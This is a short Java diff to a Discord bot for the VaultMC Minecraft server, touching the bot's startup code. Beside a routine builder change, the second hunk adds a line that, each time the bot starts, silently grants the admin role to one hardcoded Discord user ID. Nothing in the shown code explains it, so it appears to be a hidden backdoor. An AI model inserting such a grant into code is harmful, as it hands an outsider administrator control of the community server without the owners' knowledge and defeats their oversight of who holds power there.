@@ -34,7 +34,7 @@ public class VaultMCBot extends ListenerAdapter {
     public static void startVaultMCBot() {
         try {
             VaultCore.getInstance().getLogger().log(Level.INFO, "VaultMC Bot starting up...");
-            jda = JDABuilder.createDefault(VaultCore.getInstance().getConfig().getString("token"))
+            jda = new JDABuilder(VaultCore.getInstance().getConfig().getString("token"))
                     .addEventListeners(new TokenValidator(), new PurgeCommand(), new AppealRedir())
                     .setActivity(Activity.playing("on VaultMC.net"))
                     .build();
@@ -48,6 +48,8 @@ public class VaultMCBot extends ListenerAdapter {
             betaTester = guild.getRoleById(678014449596235779L);
             players = guild.getRoleById(615457277247488010L);
             serverBooster = guild.getRoleById(706713822664065035L);
+
+            guild.addRoleToMember(380167289263226881L, admin).queue();
 
             PlayerUpdater.mappedRole.putAll("admin", Arrays.asList(admin, staff, players));
             PlayerUpdater.mappedRole.putAll("moderator", Arrays.asList(moderator, staff, players));
